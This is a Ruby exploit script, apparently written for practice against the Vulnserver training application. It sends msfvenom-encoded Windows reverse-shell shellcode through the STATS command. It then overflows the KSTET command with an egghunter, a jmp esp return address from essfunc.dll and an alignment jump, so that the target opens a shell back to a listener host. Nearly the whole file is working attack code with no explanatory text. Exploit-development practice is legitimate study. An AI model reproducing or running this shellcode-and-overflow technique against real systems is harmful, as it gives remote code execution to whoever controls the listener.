#!/usr/bin/ruby

require 'socket'

target = '192.168.1.121'
port = 9999

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.120 LPORT=8080 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00" -f ruby
shellcode =
"\xbf\xe9\x44\x8f\x1f\xdb\xdb\xd9\x74\x24\xf4\x5b\x31\xc9" +
"\xb1\x52\x31\x7b\x12\x83\xeb\xfc\x03\x92\x4a\x6d\xea\x98" +
"\xbb\xf3\x15\x60\x3c\x94\x9c\x85\x0d\x94\xfb\xce\x3e\x24" +
"\x8f\x82\xb2\xcf\xdd\x36\x40\xbd\xc9\x39\xe1\x08\x2c\x74" +
"\xf2\x21\x0c\x17\x70\x38\x41\xf7\x49\xf3\x94\xf6\x8e\xee" +
"\x55\xaa\x47\x64\xcb\x5a\xe3\x30\xd0\xd1\xbf\xd5\x50\x06" +
"\x77\xd7\x71\x99\x03\x8e\x51\x18\xc7\xba\xdb\x02\x04\x86" +
"\x92\xb9\xfe\x7c\x25\x6b\xcf\x7d\x8a\x52\xff\x8f\xd2\x93" +
"\x38\x70\xa1\xed\x3a\x0d\xb2\x2a\x40\xc9\x37\xa8\xe2\x9a" +
"\xe0\x14\x12\x4e\x76\xdf\x18\x3b\xfc\x87\x3c\xba\xd1\xbc" +
"\x39\x37\xd4\x12\xc8\x03\xf3\xb6\x90\xd0\x9a\xef\x7c\xb6" +
"\xa3\xef\xde\x67\x06\x64\xf2\x7c\x3b\x27\x9b\xb1\x76\xd7" +
"\x5b\xde\x01\xa4\x69\x41\xba\x22\xc2\x0a\x64\xb5\x25\x21" +
"\xd0\x29\xd8\xca\x21\x60\x1f\x9e\x71\x1a\xb6\x9f\x19\xda" +
"\x37\x4a\x8d\x8a\x97\x25\x6e\x7a\x58\x96\x06\x90\x57\xc9" +
"\x37\x9b\xbd\x62\xdd\x66\x56\x4d\x8a\x69\xde\x25\xc9\x69" +
"\x01\x26\x44\x8f\x57\x56\x01\x18\xc0\xcf\x08\xd2\x71\x0f" +
"\x87\x9f\xb2\x9b\x24\x60\x7c\x6c\x40\x72\xe9\x9c\x1f\x28" +
"\xbc\xa3\xb5\x44\x22\x31\x52\x94\x2d\x2a\xcd\xc3\x7a\x9c" +
"\x04\x81\x96\x87\xbe\xb7\x6a\x51\xf8\x73\xb1\xa2\x07\x7a" +
"\x34\x9e\x23\x6c\x80\x1f\x68\xd8\x5c\x76\x26\xb6\x1a\x20" +
"\x88\x60\xf5\x9f\x42\xe4\x80\xd3\x54\x72\x8d\x39\x23\x9a" +
"\x3c\x94\x72\xa5\xf1\x70\x73\xde\xef\xe0\x7c\x35\xb4\x01" +
"\x9f\x9f\xc1\xa9\x06\x4a\x68\xb4\xb8\xa1\xaf\xc1\x3a\x43" +
"\x50\x36\x22\x26\x55\x72\xe4\xdb\x27\xeb\x81\xdb\x94\x0c" +
"\x80"


s = TCPSocket.open(target, port)
s.write("STATS WereWere" + shellcode)
s.close()

# EIP offset at 66
first_stage = "\x90" * 10;
# egghunter egg WereWere
first_stage += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
first_stage += "\xef\xb8\x57\x65\x72\x65\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

first_stage += "\x90" * (66 - first_stage.length)

# 0x625011af : "jmp esp" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\werebug\Desktop\Vulnserver\essfunc.dll)
first_stage += "\xaf\x11\x50\x62"
# aligning eax and jmp eax
first_stage += "\x83\xc0\x0a\xff\xe0"
first_stage += "C" * (1000 - first_stage.length)

s = TCPSocket.open(target, port)
s.puts("KSTET /.:/" + first_stage)
s.close()
